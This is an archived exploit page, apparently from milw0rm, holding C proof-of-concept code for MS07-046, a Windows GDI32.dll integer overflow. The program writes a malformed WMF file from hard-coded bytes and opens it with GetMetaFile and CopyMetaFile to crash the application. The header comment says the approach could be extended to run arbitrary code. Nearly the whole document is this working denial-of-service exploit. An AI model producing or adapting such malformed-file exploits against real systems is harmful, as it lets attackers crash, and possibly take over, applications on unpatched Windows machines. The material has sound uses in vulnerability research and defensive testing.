<html><head><title>MS Windows (GDI32.DLL) Denial of Service Exploit (MS07-046)</title></head><pre>/*
 * MS07-046(GDI32.dll Integer overflow DOS) Proof Of Concept Code
 
 * by Hong Gil-Dong &amp; Chun Woo-Chi

 * Yang yeon(?~1542), Korea
 * &quot;I shall keep clenching my left fist unitl i see the real tao&quot;.

 * This POC is only for test. If an application read a malformed wmf 
 * file like this POC, the application will be crashed. If you apply 
 * this code, you can execute an arbitrary code.
 *

 * We tested this code on Windows XP SP2 Korean Edition 
 * (GDI32.dll version 5.1.2600.3099). But it will work well on other
 * systems.
 */

#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

#define WMF_FILE &quot;ms07-046.wmf&quot;

void usage(void);

int main()
{
	
	FILE *fp;

	char wmf[] = &quot;\x01\x00\x09\x00\x00\x03\x11\x00\x00\x00\x00\x00&quot;\
                 &quot;\x05\x00\x00\x00\x00\x00\xFF\xFF\xFF\xFF\x13\x02&quot;\
                 &quot;\x32\x00\x96\x00\x03\x00\x00\x00\x00\x00&quot;;
	int i;
	
	HMETAFILE srcMeta;

    usage();

	if ((fp = fopen(WMF_FILE, &quot;w&quot;)) == NULL) {
                printf(&quot;File %s write error\n&quot;, WMF_FILE);
                return 0;
	}

	for(i=0; i&lt;sizeof(wmf)-1; i++)
		fputc(wmf[i], fp);

	fclose(fp);

    srcMeta = GetMetaFile(WMF_FILE);
    CopyMetaFile( srcMeta, NULL);

    return 0;
}

void usage(void) 
{
   printf(&quot;MS07-046 Windows Meta File RecordParms Integer Overflow \n&quot;);
   printf(&quot;Proof of Concept by Hong Gil-Dong &amp; Chun Woo-Chi \n&quot;);
      
}

// milw0rm.com [2007-08-29]</pre></html>